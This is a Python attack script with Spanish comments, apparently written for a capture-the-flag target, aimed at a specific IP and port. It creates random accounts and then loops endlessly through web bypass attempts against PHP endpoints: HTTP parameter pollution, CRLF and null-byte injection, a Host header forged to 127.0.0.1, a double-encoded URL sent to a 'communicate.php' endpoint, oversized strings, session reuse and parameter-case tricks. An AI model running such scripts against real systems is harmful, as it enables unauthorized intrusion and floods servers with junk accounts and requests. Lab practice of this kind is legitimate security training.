#!/usr/bin/env python3
"""
Voy a seguir intentando diferentes enfoques sistemáticamente
"""
import requests
import random
import string
import time

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

print("[*] CONTINUANDO INFINITAMENTE...\n")
print("[*] Enfoques pendientes:")
print("    1. Fuzzing exhaustivo de todos los parámetros")
print("    2. Intentar cache poisoning en múltiples capas")
print("    3. Explotar timing attacks")
print("    4. Probar HTTP request smuggling")
print("    5. Intentar WebSocket upgrade")
print("    6. Explotar diferencias entre Apache y PHP parser")
print("    7. Probar HPP (HTTP Parameter Pollution)")
print("    8. Intentar CRLF injection en headers")
print("    9. Explotar bugs de session handling")
print("   10. Probar integer overflow en diferentes campos")
print("\n[*] Comenzando...")

#  Voy a implementar cada enfoque sistemáticamente

iteration = 1
while True:
    print(f"\n{'='*60}")
    print(f"[*] ITERACIÓN {iteration}")
    print(f"{'='*60}\n")
    
    session = requests.Session()
    username = random_string()
    password = random_string()
    
    data = {'name': 'user1', 'username': username, 'password': password}
    session.post(f"{TARGET}/register.php", data=data)
    session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})
    
    # Enfoque 1: HTTP Parameter Pollution
    if iteration % 10 == 1:
        print("[*] Enfoque: HTTP Parameter Pollution")
        # Enviar parámetro duplicado
        resp = session.post(f"{TARGET}/", 
                           data="action=view&action=edit&new_name=PAYLOAD",
                           headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if "Done!" in resp.text:
            print("[+++] ¡HPP FUNCIONÓ!")
            break
    
    # Enfoque 2: CRLF Injection
    elif iteration % 10 == 2:
        print("[*] Enfoque: CRLF Injection")
        resp = session.post(f"{TARGET}/",
                           data={'action': 'edit\r\nX-Custom: test', 'new_name': 'TEST'})
        if "Done!" in resp.text:
            print("[+++] ¡CRLF funcionó!")
            break
    
    # Enfoque 3: Header injection
    elif iteration % 10 == 3:
        print("[*] Enfoque: Header Injection")
        resp = session.post(f"{TARGET}/",
                           data={'action': 'edit', 'new_name': 'TEST'},
                           headers={'Host': '127.0.0.1'})
        if "Done!" in resp.text:
            print("[+++] ¡Host header override funcionó!")
            break
    
    # Enfoque 4: Double encoding
    elif iteration % 10 == 4:
        print("[*] Enfoque: Double URL Encoding")
        resp = session.post(f"{TARGET}/communicate.php",
                           data={'url': 'http://motherland.com%252f/', 'data[test]': 'val'}, timeout=5)
        # Verificar respuesta
    
    # Enfoque 5: Null byte injection
    elif iteration % 10 == 5:
        print("[*] Enfoque: Null Byte")
        resp = session.post(f"{TARGET}/",
                           data={'action': 'edit\x00test', 'new_name': 'PAYLOAD'})
        if "Done!" in resp.text:
            print("[+++] ¡Null byte funcionó!")
            break
    
    # Enfoque 6: Long strings / Buffer overflow attempt
    elif iteration % 10 == 6:
        print("[*] Enfoque: Long String")
        long_string = "A" * 10000
        resp = session.post(f"{TARGET}/",
                           data={'action': 'edit', 'new_name': long_string})
        if "Done!" in resp.text:
            print("[+++] ¡Long string funcionó!")
            break
    
    # Enfoque 7: Special PHP arrays
    elif iteration % 10 == 7:
        print("[*] Enfoque: PHP Array Tricks")
        resp = session.post(f"{TARGET}/",
                           data={'action[0]': 'edit', 'new_name': 'TEST'})
        if "Done!" in resp.text:
            print("[+++] ¡Array trick funcionó!")
            break
    
    # Enfoque 8: Timing attack
    elif iteration % 10 == 8:
        print("[*] Enfoque: Timing Analysis")
        start = time.time()
        resp = session.post(f"{TARGET}/", data={'action': 'edit', 'new_name': 'T'})
        elapsed = time.time() - start
        print(f"    Tiempo: {elapsed:.3f}s")
    
    # Enfoque 9: Session fixation
    elif iteration % 10 == 9:
        print("[*] Enfoque: Session Fixation")
        # Intentar usar una sesión fija
        s2 = requests.Session()
        s2.cookies.set('PHPSESSID', session.cookies.get('PHPSESSID'))
        resp = s2.post(f"{TARGET}/", data={'action': 'edit', 'new_name': 'TEST'})
        if "Done!" in resp.text:
            print("[+++] ¡Session reuse funcionó!")
            break
    
    # Enfoque 10: Mixed case
    else:
        print("[*] Enfoque: Mixed Case Parameters")
        resp = session.post(f"{TARGET}/",
                           data={'Action': 'edit', 'new_name': 'TEST'})
        if "Done!" in resp.text:
            print("[+++] ¡Case sensitivity bypass funcionó!")
            break
    
    iteration += 1
    
    if iteration > 100:
        print("\n[*] 100 iteraciones completadas. Continuando...")
        iteration = 1
    
    time.sleep(0.5)  # Pequeña pausa para no saturar el servidor
